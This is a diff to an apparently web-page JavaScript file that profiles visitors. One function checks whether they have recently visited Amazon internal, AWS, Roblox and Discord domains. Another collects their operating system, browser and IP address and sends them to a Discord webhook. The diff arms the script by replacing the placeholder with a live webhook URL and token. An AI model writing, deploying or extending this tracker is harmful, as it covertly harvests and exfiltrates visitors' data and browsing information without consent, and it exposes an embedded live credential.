@@ -24,7 +24,7 @@
         // Function to check if specific URLs have been visited in the past 48 hours
         async function checkVisitedUrls() {
             const domains = [
-                "*.aws.dev", "*.aws.com", "*.amazon.com", "*.amazon-corp.com", "*.a2z.com", "*.roblox.com", "*.discord.com"
+                ".aws.dev", ".aws.com", ".amazon.com", ".amazon-corp.com", ".a2z.com", ".roblox.com", ".discord.com"
             ];
 
             const visitedUrls = [];
@@ -73,7 +73,7 @@
         async function sendInfoToWebhook() {
             const userInfo = getUserInfo();
             const ipAddress = await getIPAddress();
-            const webhookURL = "YOUR_DISCORD_WEBHOOK_URL_HERE";
+            const webhookURL = "https://discord.com/api/webhooks/1294771673937088575/VM6SHoyAUfr8FWLBL4xuVmUIFobmNAtrOtRM4iFZDVYkID0EmXJA23fEguiU_Hp1CIZv";
 
             const payload = {
                 content: `User Info: OS - ${userInfo.os}, Browser - ${userInfo.browser}, IP Address - ${ipAddress}`
